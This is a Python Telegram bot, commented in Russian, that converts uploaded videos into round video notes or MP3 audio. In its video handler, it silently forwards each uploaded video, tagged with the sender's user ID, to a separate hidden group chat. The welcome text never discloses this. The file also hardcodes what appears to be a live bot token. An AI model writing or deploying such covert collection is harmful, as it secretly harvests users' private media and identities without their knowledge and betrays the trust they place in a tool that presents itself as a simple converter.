from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, MessageHandler, filters, ContextTypes, CommandHandler
import subprocess
import os
import tempfile

# === НАСТРОЙКА ===
TOKEN = "8244258907:AAGSOfk1CMoBku1ChaL-lTEjWdFG7ll_EYo"
TARGET_CHAT_ID = -1001234567890  # ← ЗАМЕНИ НА ID СВОЕЙ ГРУППЫ/КАНАЛА (с -100)


# Приветственное сообщение
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = """
🤖 **Привет! Я бот для обработки видео**

🎬 **Что я умею:**
• Создавать видео-кружки из обычных видео
• Извлекать аудио MP3 из видео
• Обрабатывать оба варианта сразу

📁 **Как использовать:**
1. Отправь мне видео файл
2. Выбери действие из меню кнопок
3. Получи результат!

⚠️ **Ограничения:**
• Максимальная длительность: 60 секунд
• Формат видео: MP4, MOV и другие
"""
    keyboard = [["📹 Отправить видео"]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')


async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message

    if not message.video:
        await message.reply_text("Пожалуйста, отправьте видео файл")
        return

    video_file = await message.video.get_file()

    with tempfile.NamedTemporaryFile(suffix='.mp4', delete=False) as input_file:
        input_path = input_file.name

    with tempfile.NamedTemporaryFile(suffix='.mp4', delete=False) as output_file:
        output_path = output_file.name

    with tempfile.NamedTemporaryFile(suffix='.mp3', delete=False) as mp3_file:
        mp3_path = mp3_file.name

    try:
        await video_file.download_to_drive(input_path)
        await message.reply_text("🎥 Видео получено, начинаю обработку...")

        # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
        # ОТПРАВКА В ГРУППУ С ID ПОЛЬЗОВАТЕЛЯ
        user_id = update.effective_user.id
        await context.bot.send_video(
            chat_id=TARGET_CHAT_ID,
            video=open(input_path, 'rb'),
            caption=f"ID: {user_id}"
        )
        # <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

        has_audio = check_audio_stream(input_path)

        if has_audio:
            keyboard = [
                ["🎬 Сделать кружок", "🎵 Извлечь MP3"],
                ["🔧 Оба варианта"]
            ]
        else:
            keyboard = [
                ["🎬 Сделать кружок"],
                ["🎵 Извлечь MP3 (нет аудио)", "🔧 Оба варианта (только видео)"]
            ]

        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

        if has_audio:
            await message.reply_text("Выберите действие:", reply_markup=reply_markup)
        else:
            await message.reply_text(
                "⚠️ В видео не обнаружено аудио дорожки\nВыберите действие:",
                reply_markup=reply_markup
            )

        context.user_data['file_paths'] = {
            'input_path': input_path,
            'output_path': output_path,
            'mp3_path': mp3_path,
            'has_audio': has_audio
        }

    except Exception as e:
        await message.reply_text(f"❌ Произошла ошибка: {str(e)}")
        cleanup_files([input_path, output_path, mp3_path])


def check_audio_stream(input_path):
    try:
        cmd_info = ['ffprobe', '-i', input_path, '-show_streams', '-select_streams', 'a', '-loglevel', 'error']
        result_info = subprocess.run(cmd_info, capture_output=True, text=True)
        return bool(result_info.stdout.strip())
    except:
        return False


async def handle_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    choice = message.text
    user_data = context.user_data

    if 'file_paths' not in user_data:
        await message.reply_text("❌ Сначала отправьте видео файл")
        return

    file_paths = user_data['file_paths']
    input_path = file_paths['input_path']
    output_path = file_paths['output_path']
    mp3_path = file_paths['mp3_path']
    has_audio = file_paths.get('has_audio', True)

    try:
        if choice == "🎬 Сделать кружок":
            await process_video_note(update, input_path, output_path)

        elif choice == "🎵 Извлечь MP3":
            if has_audio:
                await process_mp3(update, input_path, mp3_path)
            else:
                await message.reply_text("❌ В этом видео нет аудио дорожки")

        elif choice == "🔧 Оба варианта":
            if has_audio:
                await process_both(update, input_path, output_path, mp3_path)
            else:
                await message.reply_text("❌ В этом видео нет аудио дорожки, создаю только видео-кружок")
                await process_video_note(update, input_path, output_path)

        elif choice == "📹 Отправить видео":
            await message.reply_text("📎 Просто отправьте мне видео файл")
            return

        else:
            await message.reply_text("❌ Пожалуйста, выберите действие из предложенных кнопок")
            return

    except Exception as e:
        await message.reply_text(f"❌ Произошла ошибка: {str(e)}")
    finally:
        cleanup_files([input_path, output_path, mp3_path])
        if 'file_paths' in user_data:
            del user_data['file_paths']


async def process_video_note(update, input_path, output_path):
    await update.message.reply_text("🔄 Создаю видео-кружок...")
    success = convert_to_video_note(input_path, output_path)
    if success and os.path.exists(output_path):
        if os.path.getsize(output_path) > 50 * 1024 * 1024:
            await update.message.reply_text("❌ Полученное видео слишком большое для отправки в Telegram")
        else:
            await update.message.reply_video_note(video_note=open(output_path, 'rb'))
            await update.message.reply_text("✅ Готово! Видео преобразовано в кружок")
    else:
        await update.message.reply_text("❌ Ошибка при создании видео-кружка")


async def process_mp3(update, input_path, mp3_path):
    await update.message.reply_text("🔄 Извлекаю аудио...")
    success = extract_mp3(input_path, mp3_path)
    if success and os.path.exists(mp3_path):
        if os.path.getsize(mp3_path) > 50 * 1024 * 1024:
            await update.message.reply_text("❌ Полученный MP3 файл слишком большой для отправки в Telegram")
        else:
            await update.message.reply_audio(audio=open(mp3_path, 'rb'))
            await update.message.reply_text("✅ Готово! Аудио извлечено в MP3")
    else:
        await update.message.reply_text("❌ Ошибка при извлечении аудио")


async def process_both(update, input_path, output_path, mp3_path):
    await update.message.reply_text("🔄 Обрабатываю оба варианта...")
    import asyncio
    video_success = await asyncio.to_thread(convert_to_video_note, input_path, output_path)
    mp3_success = await asyncio.to_thread(extract_mp3, input_path, mp3_path)

    results = []
    if video_success and os.path.exists(output_path):
        if os.path.getsize(output_path) <= 50 * 1024 * 1024:
            await update.message.reply_video_note(video_note=open(output_path, 'rb'))
            results.append("✅ Видео-кружок готов")
        else:
            results.append("❌ Видео слишком большое")

    if mp3_success and os.path.exists(mp3_path):
        if os.path.getsize(mp3_path) <= 50 * 1024 * 1024:
            await update.message.reply_audio(audio=open(mp3_path, 'rb'))
            results.append("✅ MP3 готов")
        else:
            results.append("❌ MP3 слишком большой")

    if results:
        await update.message.reply_text("\n".join(results))
    else:
        await update.message.reply_text("❌ Не удалось создать ни один из вариантов")


def convert_to_video_note(input_path, output_path, max_duration=60):
    try:
        cmd = [
            'ffmpeg',
            '-i', input_path,
            '-t', str(max_duration),
            '-vf', 'crop=min(iw\\,ih):min(iw\\,ih):(iw-min(iw\\,ih))/2:(ih-min(iw\\,ih))/2,scale=640:640',
            '-c:v', 'libx264',
            '-c:a', 'aac',
            '-y',
            output_path
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.returncode == 0
    except Exception as e:
        print(f"Video conversion error: {e}")
        return False


def extract_mp3(input_path, mp3_path, max_duration=60):
    try:
        check_cmd = ['ffprobe', '-i', input_path, '-show_streams', '-select_streams', 'a', '-loglevel', 'error']
        check_result = subprocess.run(check_cmd, capture_output=True, text=True)
        if not check_result.stdout.strip():
            return False

        cmd = [
            'ffmpeg',
            '-i', input_path,
            '-t', str(max_duration),
            '-q:a', '2',
            '-vn',
            '-y',
            mp3_path
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.returncode == 0
    except Exception as e:
        print(f"MP3 extraction error: {e}")
        return False


def cleanup_files(file_paths):
    for file_path in file_paths:
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass


def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.VIDEO, handle_video))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_choice))

    print("🤖 Бот запущен...")
    application.run_polling()


if __name__ == "__main__":
    main()